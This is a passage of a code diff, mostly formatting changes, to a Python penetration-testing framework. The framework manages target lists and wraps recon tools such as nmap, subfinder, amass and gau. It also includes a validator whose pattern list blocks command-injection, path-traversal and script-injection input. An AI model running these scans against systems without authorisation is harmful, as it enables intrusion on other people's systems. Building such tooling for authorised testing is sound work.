logger.log(f\"\u26a0\ufe0f Skipped {invalid_count} invalid targets\", \"WARNING\")\n+                        logger.log(\n+                            f\"\u26a0\ufe0f Skipped {invalid_count} invalid targets\", \"WARNING\"\n+                        )\n                 else:\n                     logger.log(\"\u274c No valid targets found in file\", \"ERROR\")\n             except Exception as e:\n                 logger.log(f\"\u274c Error reading file: {e}\", \"ERROR\")\n         else:\n             logger.log(\"\u274c File not found or not accessible\", \"ERROR\")\n     else:\n         logger.log(\"\u274c Invalid file path\", \"ERROR\")\n     input(\"Press Enter to continue...\")\n \n+\n def remove_individual_target():\n     \"\"\"Remove individual targets with selection menu\"\"\"\n     targets = read_lines(TARGETS)\n     if not targets:\n         logger.log(\"\ud83d\udccb No targets to remove\", \"INFO\")\n@@ -7943,20 +9866,29 @@\n     print(f\"\\n\\033[92m\ud83d\udccb Current Targets ({len(targets)} total):\\033[0m\")\n     for i, target in enumerate(targets, 1):\n         print(f\"    {i:2d}. {target}\")\n \n     try:\n-        choice = input(f\"\\n\\033[93mEnter target number to remove (1-{len(targets)}) or 'back': \\033[0m\").strip()\n-\n-        if choice.lower() == 'back':\n+        choice = input(\n+            f\"\\n\\033[93mEnter target number to remove (1-{len(targets)}) or 'back': \\033[0m\"\n+        ).strip()\n+\n+        if choice.lower() == \"back\":\n             return\n \n         if choice.isdigit():\n             index = int(choice) - 1\n             if 0 <= index < len(targets):\n                 target_to_remove = targets[index]\n-                if input(f\"\\n\\033[91mConfirm removal of '{target_to_remove}'? (yes/no): \\033[0m\").strip().lower() == \"yes\":\n+                if (\n+                    input(\n+                        f\"\\n\\033[91mConfirm removal of '{target_to_remove}'? (yes/no): \\033[0m\"\n+                    )\n+                    .strip()\n+                    .lower()\n+                    == \"yes\"\n+                ):\n                     targets.pop(index)\n                     write_lines(TARGETS, targets)\n                     logger.log(f\"\u2705 Target '{target_to_remove}' removed\", \"SUCCESS\")\n                 else:\n                     logger.log(\"Removal cancelled\", \"INFO\")\n@@ -7967,15 +9899,16 @@\n     except ValueError:\n         logger.log(\"\u274c Invalid selection\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n \n+\n def manage_target_lists():\n     \"\"\"Manage multiple target list files\"\"\"\n-    print(\"\\n\\033[96m\" + \"=\"*60 + \"\\033[0m\")\n+    print(\"\\n\\033[96m\" + \"=\" * 60 + \"\\033[0m\")\n     print(\"\\033[96mTARGET LIST MANAGEMENT\".center(60) + \"\\033[0m\")\n-    print(\"\\033[96m\" + \"=\"*60 + \"\\033[0m\")\n+    print(\"\\033[96m\" + \"=\" * 60 + \"\\033[0m\")\n \n     # List existing target files\n     target_files = list(HERE.glob(\"targets*.txt\"))\n \n     print(\"\\033[95m1. Create New Target List\\033[0m\")\n@@ -7998,18 +9931,19 @@\n     elif choice == \"5\":\n         view_all_target_lists(target_files)\n \n     input(\"Press Enter to continue...\")\n \n+\n def create_target_categories():\n     \"\"\"Create categorized target lists\"\"\"\n     categories = {\n         \"production\": \"Production/Live Targets\",\n         \"staging\": \"Staging/Test Targets\",\n         \"internal\": \"Internal/Private Targets\",\n         \"external\": \"External/Public Targets\",\n-        \"bounty\": \"Bug Bounty Targets\"\n+        \"bounty\": \"Bug Bounty Targets\",\n     }\n \n     print(\"\\n\\033[92m\ud83d\udcc2 Available Categories:\\033[0m\")\n     for key, desc in categories.items():\n         print(f\"    {key}: {desc}\")\n@@ -8025,10 +9959,11 @@\n     else:\n         logger.log(\"\u274c Invalid category\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n \n+\n def validate_all_targets():\n     \"\"\"Validate all configured targets\"\"\"\n     targets = read_lines(TARGETS)\n     if not targets:\n         logger.log(\"\ud83d\udccb No targets to validate\", \"INFO\")\n@@ -8051,15 +9986,23 @@\n     print(\"\\n\\033[92m\ud83d\udcca Validation Results:\\033[0m\")\n     print(f\"    \u2705 Valid: {len(valid_targets)}\")\n     print(f\"    \u274c Invalid: {len(invalid_targets)}\")\n \n     if invalid_targets:\n-        if input(f\"\\n\\033[93mRemove {len(invalid_targets)} invalid targets? (yes/no): \\033[0m\").strip().lower() == \"yes\":\n+        if (\n+            input(\n+                f\"\\n\\033[93mRemove {len(invalid_targets)} invalid targets? (yes/no): \\033[0m\"\n+            )\n+            .strip()\n+            .lower()\n+            == \"yes\"\n+        ):\n             write_lines(TARGETS, valid_targets)\n             logger.log(f\"\u2705 Removed {len(invalid_targets)} invalid targets\", \"SUCCESS\")\n \n     input(\"Press Enter to continue...\")\n+\n \n def clear_all_targets():\n     \"\"\"Clear all targets with confirmation\"\"\"\n     targets = read_lines(TARGETS)\n     if not targets:\n@@ -8072,61 +10015,75 @@\n         else:\n             logger.log(\"Clear cancelled\", \"INFO\")\n \n     input(\"Press Enter to continue...\")\n \n+\n # Supporting functions for enhanced target management\n def validate_target(target: str) -> bool:\n     \"\"\"Validate a single target (domain or IP)\"\"\"\n     return validate_target_input(target) and validate_single_target(target)\n \n+\n def validate_target_input(target: str) -> bool:\n     \"\"\"Validate target input format\"\"\"\n     if not target or len(target) > 200:\n         return False\n \n     # Enhanced validation patterns\n     import re\n \n     # More flexible domain pattern that allows single words for testing\n-    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*$'\n-    url_pattern = r'^https?://[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*(/[^\\s]*)?$'\n-    ip_pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'\n+    domain_pattern = r\"^[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*$\"\n+    url_pattern = r\"^https?://[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*(/[^\\s]*)?$\"\n+    ip_pattern = r\"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\"\n \n     # Check for security threats first\n     dangerous_patterns = [\n-        r'[;&|`$(){}[\\]\\\\]',  # Command injection\n-        r'\\.\\./',             # Path traversal\n-        r'<script',           # XSS\n-        r'javascript:',       # JavaScript injection\n+        r\"[;&|`$(){}[\\]\\\\]\",  # Command injection\n+        r\"\\.\\./\",  # Path traversal\n+        r\"<script\",  # XSS\n+        r\"javascript:\",  # JavaScript injection\n     ]\n \n     for dangerous in dangerous_patterns:\n         if re.search(dangerous, target, re.IGNORECASE):\n             return False\n \n-    return bool(re.match(domain_pattern, target) or re.match(url_pattern, target) or re.match(ip_pattern, target))\n+    return bool(\n+        re.match(domain_pattern, target)\n+        or re.match(url_pattern, target)\n+        or re.match(ip_pattern, target)\n+    )\n+\n \n def validate_single_target(target: str) -> bool:\n     \"\"\"Validate a single target (basic format check)\"\"\"\n     try:\n         return validate_target_input(target)\n     except Exception:\n         return False\n \n+\n def create_new_target_list():\n     \"\"\"Create a new target list file\"\"\"\n     name = input(\"\\n\\033[93mEnter target list name: \\033[0m\").strip()\n-    if name and validate_input(name, {\"max_length\": 50, \"pattern\": r\"^[a-zA-Z0-9_-]+$\"}):\n+    if name and validate_input(\n+        name, {\"max_length\": 50, \"pattern\": r\"^[a-zA-Z0-9_-]+$\"}\n+    ):\n         target_file = HERE / f\"targets_{name}.txt\"\n         if not target_file.exists():\n             target_file.touch()\n             logger.log(f\"\u2705 Created target list '{name}' at {target_file}\", \"SUCCESS\")\n         else:\n             logger.log(f\"\ud83d\udcc2 Target list '{name}' already exists\", \"WARNING\")\n     else:\n-        logger.log(\"\u274c Invalid name. Use only letters, numbers, underscore, and hyphen\", \"ERROR\")\n+        logger.log(\n+            \"\u274c Invalid name. Use only letters, numbers, underscore, and hyphen\",\n+            \"ERROR\",\n+        )\n+\n \n def switch_active_target_list(target_files):\n     \"\"\"Switch to a different target list\"\"\"\n     if not target_files:\n         logger.log(\"\ud83d\udccb No target lists found\", \"INFO\")\n@@ -8137,21 +10094,24 @@\n         count = len(read_lines(tf))\n         current = \" (CURRENT)\" if tf == TARGETS else \"\"\n         print(f\"    {i}. {tf.name} ({count} targets){current}\")\n \n     try:\n-        choice = int(input(f\"\\n\\033[93mSelect list (1-{len(target_files)}): \\033[0m\").strip())\n+        choice = int(\n+            input(f\"\\n\\033[93mSelect list (1-{len(target_files)}): \\033[0m\").strip()\n+        )\n         if 1 <= choice <= len(target_files):\n             selected_file = target_files[choice - 1]\n             # Copy selected file to active targets.txt\n             shutil.copy2(selected_file, TARGETS)\n             logger.log(f\"\u2705 Switched to target list: {selected_file.name}\", \"SUCCESS\")\n         else:\n             logger.log(\"\u274c Invalid selection\", \"ERROR\")\n     except ValueError:\n         logger.log(\"\u274c Invalid input\", \"ERROR\")\n \n+\n def merge_target_lists(target_files):\n     \"\"\"Merge multiple target lists\"\"\"\n     if len(target_files) < 2:\n         logger.log(\"\ud83d\udccb Need at least 2 target lists to merge\", \"INFO\")\n         return\n@@ -8175,10 +10135,11 @@\n         else:\n             logger.log(\"\u274c No targets to merge\", \"ERROR\")\n     except (ValueError, IndexError):\n         logger.log(\"\u274c Invalid selection\", \"ERROR\")\n \n+\n def delete_target_list(target_files):\n     \"\"\"Delete a target list\"\"\"\n     if not target_files:\n         logger.log(\"\ud83d\udccb No target lists to delete\", \"INFO\")\n         return\n@@ -8193,23 +10154,33 @@\n     for i, tf in enumerate(deletable_files, 1):\n         count = len(read_lines(tf))\n         print(f\"    {i}. {tf.name} ({count} targets)\")\n \n     try:\n-        choice = int(input(f\"\\n\\033[91mSelect list to DELETE (1-{len(deletable_files)}): \\033[0m\").strip())\n+        choice = int(\n+            input(\n+                f\"\\n\\033[91mSelect list to DELETE (1-{len(deletable_files)}): \\033[0m\"\n+            ).strip()\n+        )\n         if 1 <= choice <= len(deletable_files):\n             file_to_delete = deletable_files[choice - 1]\n-            if input(f\"\\033[91mConfirm deletion of '{file_to_delete.name}'? (DELETE): \\033[0m\").strip() == \"DELETE\":\n+            if (\n+                input(\n+                    f\"\\033[91mConfirm deletion of '{file_to_delete.name}'? (DELETE): \\033[0m\"\n+                ).strip()\n+                == \"DELETE\"\n+            ):\n                 file_to_delete.unlink()\n                 logger.log(f\"\u2705 Deleted target list: {file_to_delete.name}\", \"SUCCESS\")\n             else:\n                 logger.log(\"Deletion cancelled\", \"INFO\")\n         else:\n             logger.log(\"\u274c Invalid selection\", \"ERROR\")\n     except ValueError:\n         logger.log(\"\u274c Invalid input\", \"ERROR\")\n \n+\n def view_all_target_lists(target_files):\n     \"\"\"View all target lists with statistics\"\"\"\n     if not target_files:\n         logger.log(\"\ud83d\udccb No target lists found\", \"INFO\")\n         return\n@@ -8230,19 +10201,25 @@\n         elif count > 5:\n             for target in targets[:3]:\n                 print(f\"     \u2022 {target}\")\n             print(f\"     ... and {count - 3} more\")\n \n-    print(f\"\\n\\033[96m\ud83d\udcc8 Total: {total_targets} targets across {len(target_files)} lists\\033[0m\")\n+    print(\n+        f\"\\n\\033[96m\ud83d\udcc8 Total: {total_targets} targets across {len(target_files)} lists\\033[0m\"\n+    )\n+\n \n def refresh_and_merge():\n     cfg = load_cfg()\n     logger.log(\"Refreshing sources...\", \"INFO\")\n     sources = refresh_external_sources(cfg)\n     logger.log(\"Merging wordlists...\", \"INFO\")\n-    merge_wordlists(sources[\"SecLists\"], sources[\"PayloadsAllTheThings\"], sources[\"Wordlists\"])\n+    merge_wordlists(\n+        sources[\"SecLists\"], sources[\"PayloadsAllTheThings\"], sources[\"Wordlists\"]\n+    )\n     logger.log(\"Sources refreshed and wordlists merged.\", \"SUCCESS\")\n+\n \n def run_recon():\n     cfg = load_cfg()\n     env = env_with_lists()\n     rd = new_run()\n@@ -8251,10 +10228,11 @@\n         stage_recon(rd, env, cfg)\n         logger.log(f\"Recon complete. Run: {rd}\", \"SUCCESS\")\n     finally:\n         cleanup_resource_monitor(stop_event, th)\n \n+\n def run_vuln():\n     cfg = load_cfg()\n     env = env_with_lists()\n     rd = new_run()\n     stop_event, th = create_resource_monitor_thread(cfg)\n@@ -8294,12 +10272,15 @@\n         logger.log(\"Generating enhanced report...\", \"INFO\")\n         cfg = load_cfg()\n         env = env_with_lists()\n \n         # Get latest run directory\n-        runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()],\n-                     key=lambda p: p.stat().st_mtime, reverse=True)\n+        runs = sorted(\n+            [d for d in RUNS_DIR.iterdir() if d.is_dir()],\n+            key=lambda p: p.stat().st_mtime,\n+            reverse=True,\n+        )\n         if not runs:\n             logger.log(\"No runs found for reporting\", \"WARNING\")\n             return\n \n         rd = runs[0]\n@@ -8316,14 +10297,19 @@\n                 logger.log(f\"Report saved to: {html_report}\", \"INFO\")\n \n     except Exception as e:\n         logger.log(f\"Enhanced report generation failed: {e}\", \"ERROR\")\n \n+\n def run_report_for_latest():\n     cfg = load_cfg()\n     env = env_with_lists()\n-    runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()], key=lambda p: p.stat().st_mtime, reverse=True)\n+    runs = sorted(\n+        [d for d in RUNS_DIR.iterdir() if d.is_dir()],\n+        key=lambda p: p.stat().st_mtime,\n+        reverse=True,\n+    )\n     if not runs:\n         logger.log(\"No runs to report\", \"WARNING\")\n         return\n     rd = runs[0]\n     stage_report(rd, env, cfg)\n@@ -8332,14 +10318,15 @@\n         try:\n             webbrowser.open(html.as_uri())\n         except Exception:\n             logger.log(f\"Open report: {html}\", \"INFO\")\n \n+\n def plugins_menu():\n-    print(\"\\n\\033[96m\" + \"=\"*80 + \"\\033[0m\")\n+    print(\"\\n\\033[96m\" + \"=\" * 80 + \"\\033[0m\")\n     print(\"\\033[96mPLUGINS\".center(80) + \"\\033[0m\")\n-    print(\"\\033[96m\" + \"=\"*80 + \"\\033[0m\")\n+    print(\"\\033[96m\" + \"=\" * 80 + \"\\033[0m\")\n     print(\"\\033[95m1. List\\033[0m\")\n     print(\"\\033[95m2. Create template\\033[0m\")\n     print(\"\\033[95m3. Execute plugin\\033[0m\")\n     print(\"\\033[91m4. Back\\033[0m\")\n     s = input(\"\\n\\033[93mSelect (1-4): \\033[0m\").strip()\n@@ -8360,19 +10347,23 @@\n         name = input(\"Plugin to execute: \").strip()\n         if name:\n             rd = new_run()\n             execute_plugin(name, rd, env_with_lists(), load_cfg())\n \n+\n # ---------- Enhanced Automation Functions ----------\n def run_eslint_security_check():\n     \"\"\"Run ESLint security checks on JavaScript files\"\"\"\n     print(\"\\n\\033[96m=== ESLint Security Check ===\\033[0m\")\n \n     try:\n         # Check if Node.js and npm are available\n         if not shutil.which(\"npm\"):\n-            logger.log(\"npm not found. Please install Node.js and npm for ESLint integration\", \"WARNING\")\n+            logger.log(\n+                \"npm not found. Please install Node.js and npm for ESLint integration\",\n+                \"WARNING\",\n+            )\n             input(\"Press Enter to continue...\")\n             return\n \n         # Install ESLint dependencies if needed\n         package_json = HERE / \"package.json\"\n@@ -8382,11 +10373,11 @@\n                 run_cmd,\n                 [\"npm\", \"install\"],\n                 cwd=str(HERE),\n                 timeout=120,\n                 capture=True,\n-                check_return=False\n+                check_return=False,\n             )\n \n             if result and result.returncode == 0:\n                 logger.log(\"ESLint dependencies installed successfully\", \"SUCCESS\")\n             else:\n@@ -8398,11 +10389,11 @@\n             run_cmd,\n             [\"npm\", \"run\", \"lint:security\"],\n             cwd=str(HERE),\n             timeout=60,\n             capture=True,\n-            check_return=False\n+            check_return=False,\n         )\n \n         if result:\n             if result.returncode == 0:\n                 logger.log(\"ESLint security check completed successfully\", \"SUCCESS\")\n@@ -8416,10 +10407,11 @@\n     except Exception as e:\n         logger.log(f\"ESLint security check error: {e}\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n \n+\n def run_bug_bounty_automation():\n     \"\"\"Run comprehensive bug bounty automation\"\"\"\n     print(\"\\n\\033[96m=== Bug Bounty Automation ===\\033[0m\")\n \n     try:\n@@ -8429,13 +10421,14 @@\n             input(\"Press Enter to continue...\")\n             return\n \n         # Get primary target (first one)\n         primary_target = targets[0].strip()\n-        if primary_target.startswith(('http://', 'https://')):\n+        if primary_target.startswith((\"http://\", \"https://\")):\n             # Extract domain from URL\n             from urllib.parse import urlparse\n+\n             parsed = urlparse(primary_target)\n             primary_target = parsed.netloc\n \n         logger.log(f\"Starting bug bounty automation for: {primary_target}\", \"INFO\")\n \n@@ -8446,10 +10439,11 @@\n             input(\"Press Enter to continue...\")\n             return\n \n         # Make sure script is executable\n         import stat\n+\n         current_perms = bug_bounty_script.stat().st_mode\n         bug_bounty_script.chmod(current_perms | stat.S_IEXEC)\n \n         # Run bug bounty automation\n         logger.log(\"Executing comprehensive bug bounty reconnaissance...\", \"INFO\")\n@@ -8462,37 +10456,50 @@\n             run_cmd,\n             [str(bug_bounty_script), primary_target],\n             cwd=str(HERE),\n             timeout=1800,  # 30 minutes timeout\n             capture=True,\n-            check_return=False\n+            check_return=False,\n         )\n \n         if result:\n             if result.returncode == 0:\n                 logger.log(\"Bug bounty automation completed successfully\", \"SUCCESS\")\n \n                 # Copy results to run directory\n                 bug_bounty_results = HERE / \"bug_bounty_results\"\n                 if bug_bounty_results.exists():\n                     import shutil as sh\n-                    sh.copytree(bug_bounty_results, run_dir / \"bug_bounty_results\", dirs_exist_ok=True)\n-                    logger.log(f\"Results copied to: {run_dir / 'bug_bounty_results'}\", \"INFO\")\n+\n+                    sh.copytree(\n+                        bug_bounty_results,\n+                        run_dir / \"bug_bounty_results\",\n+                        dirs_exist_ok=True,\n+                    )\n+                    logger.log(\n+                        f\"Results copied to: {run_dir / 'bug_bounty_results'}\", \"INFO\"\n+                    )\n \n             else:\n-                logger.log(f\"Bug bounty automation completed with warnings (exit code: {result.returncode})\", \"WARNING\")\n+                logger.log(\n+                    f\"Bug bounty automation completed with warnings (exit code: {result.returncode})\",\n+                    \"WARNING\",\n+                )\n \n             # Show summary output\n             if result.stdout:\n-                print(f\"\\nBug Bounty Summary:\\n{result.stdout[-1000:]}\")  # Last 1000 chars\n+                print(\n+                    f\"\\nBug Bounty Summary:\\n{result.stdout[-1000:]}\"\n+                )  # Last 1000 chars\n         else:\n             logger.log(\"Bug bounty automation failed to execute\", \"ERROR\")\n \n     except Exception as e:\n         logger.log(f\"Bug bounty automation error: {e}\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n+\n \n def run_automated_testing_chain():\n     \"\"\"Run comprehensive automated testing chain\"\"\"\n     print(\"\\n\\033[96m=== Automated Testing Chain ===\\033[0m\")\n \n@@ -8530,10 +10537,11 @@\n     except Exception as e:\n         logger.log(f\"Automated testing chain error: {e}\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n \n+\n def run_enhanced_recon():\n     \"\"\"Run enhanced reconnaissance with additional tools\"\"\"\n     print(\"\\n\\033[96m=== Enhanced Reconnaissance ===\\033[0m\")\n \n     targets = read_lines(TARGETS)\n@@ -8558,10 +10566,11 @@\n \n     # Web crawling and URL collection\n     enhanced_web_crawling(targets, rd, cfg)\n \n     logger.log(\"Enhanced reconnaissance completed\", \"SUCCESS\")\n+\n \n def enhanced_subdomain_enum(targets, run_dir, cfg):\n     \"\"\"Enhanced subdomain enumeration with multiple tools\"\"\"\n     logger.log(\"Running enhanced subdomain enumeration...\", \"INFO\")\n \n@@ -8582,38 +10591,41 @@\n                     result = safe_execute(\n                         run_cmd,\n                         [\"subfinder\", \"-d\", target, \"-silent\"],\n                         capture=True,\n                         timeout=300,\n-                        check_return=False\n+                        check_return=False,\n                     )\n                 elif tool == \"amass\":\n                     result = safe_execute(\n                         run_cmd,\n                         [\"amass\", \"enum\", \"-d\", target, \"-passive\"],\n                         capture=True,\n                         timeout=300,\n-                        check_return=False\n+                        check_return=False,\n                     )\n                 elif tool == \"assetfinder\":\n                     result = safe_execute(\n                         run_cmd,\n                         [\"assetfinder\", \"--subs-only\", target],\n                         capture=True,\n                         timeout=300,\n-                        check_return=False\n+                        check_return=False,\n                     )\n \n                 if result and result.stdout:\n-                    results.extend(result.stdout.strip().split('\\n'))\n+                    results.extend(result.stdout.strip().split(\"\\n\"))\n \n         # Deduplicate and save results\n         if results:\n             unique_subdomains = sorted(set(filter(None, results)))\n             subdomain_file = run_dir / f\"subdomains_{target.replace('.', '_')}.txt\"\n             write_lines(subdomain_file, unique_subdomains)\n-            logger.log(f\"Found {len(unique_subdomains)} subdomains for {target}\", \"SUCCESS\")\n+            logger.log(\n+                f\"Found {len(unique_subdomains)} subdomains for {target}\", \"SUCCESS\"\n+            )\n+\n \n def enhanced_port_scanning(targets, run_dir, cfg):\n     \"\"\"Enhanced port scanning with multiple tools\"\"\"\n     logger.log(\"Running enhanced port scanning...\", \"INFO\")\n \n@@ -8630,18 +10642,19 @@\n             result = safe_execute(\n                 run_cmd,\n                 [\"nmap\", \"-T4\", \"-top-ports\", \"1000\", \"--open\", \"-oG\", \"-\", target],\n                 capture=True,\n                 timeout=600,\n-                check_return=False\n+                check_return=False,\n             )\n \n             if result and result.stdout:\n                 ports_file = run_dir / f\"ports_{target.replace('.', '_')}.txt\"\n-                with open(ports_file, 'w') as f:\n+                with open(ports_file, \"w\") as f:\n                     f.write(result.stdout)\n                 logger.log(f\"Port scan completed for {target}\", \"SUCCESS\")\n+\n \n def enhanced_tech_detection(targets, run_dir, cfg):\n     \"\"\"Enhanced technology detection\"\"\"\n     logger.log(\"Running enhanced technology detection...\", \"INFO\")\n \n@@ -8649,27 +10662,30 @@\n         target = target.strip()\n         if not target:\n             continue\n \n         # Ensure target has protocol\n-        if not target.startswith(('http://', 'https://')):\n+        if not target.startswith((\"http://\", \"https://\")):\n             target = f\"https://{target}\"\n \n         # Use httpx for technology detection\n         if shutil.which(\"httpx\"):\n             result = safe_execute(\n                 run_cmd,\n                 [\"httpx\", \"-u\", target, \"-tech-detect\", \"-title\", \"-silent\"],\n                 capture=True,\n                 timeout=60,\n-                check_return=False\n+                check_return=False,\n             )\n \n             if result and result.stdout:\n-                tech_file = run_dir / f\"tech_{target.replace('://', '_').replace('.', '_')}.txt\"\n-                with open(tech_file, 'w') as f:\n+                tech_file = (\n+                    run_dir / f\"tech_{target.replace('://', '_').replace('.', '_')}.txt\"\n+                )\n+                with open(tech_file, \"w\") as f:\n                     f.write(result.stdout)\n+\n \n def enhanced_web_crawling(targets, run_dir, cfg):\n     \"\"\"Enhanced web crawling for URL collection\"\"\"\n     logger.log(\"Running enhanced web crawling...\", \"INFO\")\n \n@@ -8682,51 +10698,60 @@\n         all_urls = set()\n \n         # GAU - Get All URLs\n         if shutil.which(\"gau\"):\n             result = safe_execute(\n-                run_cmd,\n-                [\"gau\", target],\n-                capture=True,\n-                timeout=120,\n-                check_return=False\n+                run_cmd, [\"gau\", target], capture=True, timeout=120, check_return=False\n             )\n             if result and result.stdout:\n-                all_urls.update(result.stdout.strip().split('\\n'))\n+                all_urls.update(result.stdout.strip().split(\"\\n\"))\n \n         # Waybackurls\n         if shutil.which(\"waybackurls\"):\n             result = safe_execute(\n                 run_cmd,\n                 [\"waybackurls\", target],\n                 capture=True,\n                 timeout=120,\n-                check_return=False\n+                check_return=False,\n             )\n             if result and result.stdout:\n-                all_urls.update(result.stdout.strip().split('\\n'))\n+                all_urls.update(result.stdout.strip().split(\"\\n\"))\n \n         # Save collected URLs\n         if all_urls:\n-            filtered_urls = [url for url in all_urls if url and url.startswith(('http://', 'https://'))]\n+            filtered_urls = [\n+                url\n+                for url in all_urls\n+                if url and url.startswith((\"http://\", \"https://\"))\n+            ]\n             if filtered_urls:\n                 urls_file = run_dir / f\"urls_{target.replace('.', '_')}.txt\"\n                 write_lines(urls_file, sorted(filtered_urls))\n-                logger.log(f\"Collected {len(filtered_urls)} URLs for {target}\", \"SUCCESS\")\n+                logger.log(\n+                    f\"Collected {len(filtered_urls)} URLs for {target}\", \"SUCCESS\"\n+                )\n+\n \n # ---------- Enhanced Menu Functions ----------\n def run_ai_vulnerability_analysis():\n     \"\"\"Run AI-powered vulnerability analysis\"\"\"\n     print(\"\\n\\033[96m=== AI-Powered Vulnerability Analysis ===\\033[0m\")\n \n     try:\n         # Find latest scan results\n-        runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()],\n-                     key=lambda p: p.stat().st_mtime, reverse=True)\n+        runs = sorted(\n+            [d for d in RUNS_DIR.iterdir() if d.is_dir()],\n+            key=lambda p: p.stat().st_mtime,\n+            reverse=True,\n+        )\n \n         if not runs:\n-            logger.log(\"No scan results found. Please run a vulnerability scan first.\", \"WARNING\")\n+            logger.log(\n+                \"No scan results found. Please run a vulnerability scan first.\",\n+                \"WARNING\",\n+            )\n             input(\"Press Enter to continue...\")\n             return\n \n         latest_run = runs[0]\n         logger.log(f\"Analyzing results from: {latest_run.name}\", \"INFO\")\n@@ -8737,24 +10762,31 @@\n \n         run_ml_vulnerability_analysis(latest_run, ml_out, cfg)\n \n         # Display results\n         if ml_out.exists():\n-            with open(ml_out, 'r') as f:\n+            with open(ml_out, \"r\") as f:\n                 results = json.load(f)\n \n             print(\"\\n[REPORT] AI Analysis Results:\")\n-            print(f\"   False Positive Reduction: {results.get('false_positive_reduction', {}).get('reduction_percentage', 0):.1f}%\")\n-            print(f\"   Risk Level: {results.get('risk_scoring', {}).get('risk_level', 'unknown').upper()}\")\n-            print(f\"   Total Risk Score: {results.get('risk_scoring', {}).get('total_risk_score', 0)}\")\n+            print(\n+                f\"   False Positive Reduction: {results.get('false_positive_reduction', {}).get('reduction_percentage', 0):.1f}%\"\n+            )\n+            print(\n+                f\"   Risk Level: {results.get('risk_scoring', {}).get('risk_level', 'unknown').upper()}\"\n+            )\n+            print(\n+                f\"   Total Risk Score: {results.get('risk_scoring', {}).get('total_risk_score', 0)}\"\n+            )\n \n         logger.log(\"AI vulnerability analysis completed\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"AI analysis error: {e}\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n+\n \n def run_cloud_security_assessment():\n     \"\"\"Run cloud security assessment\"\"\"\n     print(\"\\n\\033[96m=== Cloud Security Assessment ===\\033[0m\")\n \n@@ -8784,10 +10816,11 @@\n     except Exception as e:\n         logger.log(f\"Cloud security assessment error: {e}\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n \n+\n def run_api_security_testing():\n     \"\"\"Run API security testing\"\"\"\n     print(\"\\n\\033[96m=== API Security Testing ===\\033[0m\")\n \n     try:\n@@ -8816,10 +10849,11 @@\n     except Exception as e:\n         logger.log(f\"API security testing error: {e}\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n \n+\n def run_compliance_assessment():\n     \"\"\"Run compliance and risk assessment\"\"\"\n     print(\"\\n\\033[96m=== Compliance & Risk Assessment ===\\033[0m\")\n \n     try:\n@@ -8836,20 +10870,24 @@\n         logger.log(\"Starting compliance assessment...\", \"INFO\")\n \n         # Run compliance checks for each target\n         for target in targets:\n             target_url = target if target.startswith(\"http\") else f\"http://{target}\"\n-            compliance_out = run_dir / f\"compliance_{target.replace('.', '_').replace('/', '_')}.json\"\n+            compliance_out = (\n+                run_dir\n+                / f\"compliance_{target.replace('.', '_').replace('/', '_')}.json\"\n+            )\n \n             run_compliance_checks(target_url, compliance_out, cfg, env)\n \n         logger.log(\"Compliance assessment completed\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"Compliance assessment error: {e}\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n+\n \n def run_cicd_integration_mode():\n     \"\"\"Run CI/CD integration mode\"\"\"\n     print(\"\\n\\033[96m=== CI/CD Integration Mode ===\\033[0m\")\n \n@@ -8895,10 +10933,11 @@\n \n     except Exception as e:\n         logger.log(f\"CI/CD integration error: {e}\", \"ERROR\")\n \n     input(\"Press Enter to continue...\")\n+\n \n def setup_argument_parser() -> argparse.ArgumentParser:\n     \"\"\"Setup comprehensive command-line argument parser\"\"\"\n     parser = argparse.ArgumentParser(\n         description=\"Bl4ckC3ll_PANTHEON - Advanced Security Testing Framework\",\n@@ -8932,93 +10971,132 @@\n   --output FORMAT           Output format: json, xml, html, txt (default: txt)\n   --outfile FILE            Save results to file\n   --quiet                   Minimal output\n   --verbose                 Detailed output\n   --debug                   Debug mode with extensive logging\n-        \"\"\"\n+        \"\"\",\n     )\n \n     # Main options\n-    parser.add_argument('-t', '--target', type=str,\n-                       help='Target domain/IP or file containing targets')\n-    parser.add_argument('--targets-file', type=str,\n-                       help='File containing list of targets (one per line)')\n-    parser.add_argument('--batch', action='store_true',\n-                       help='Batch mode - non-interactive execution')\n-    parser.add_argument('--interactive', action='store_true',\n-                       help='Launch interactive menu interface (default)')\n+    parser.add_argument(\n+        \"-t\", \"--target\", type=str, help=\"Target domain/IP or file containing targets\"\n+    )\n+    parser.add_argument(\n+        \"--targets-file\",\n+        type=str,\n+        help=\"File containing list of targets (one per line)\",\n+    )\n+    parser.add_argument(\n+        \"--batch\", action=\"store_true\", help=\"Batch mode - non-interactive execution\"\n+    )\n+    parser.add_argument(\n+        \"--interactive\",\n+        action=\"store_true\",\n+        help=\"Launch interactive menu interface (default)\",\n+    )\n \n     # Scan types\n-    scan_group = parser.add_argument_group('Scan Types')\n-    scan_group.add_argument('--recon', action='store_true',\n-                           help='Run enhanced reconnaissance scan')\n-    scan_group.add_argument('--vuln', 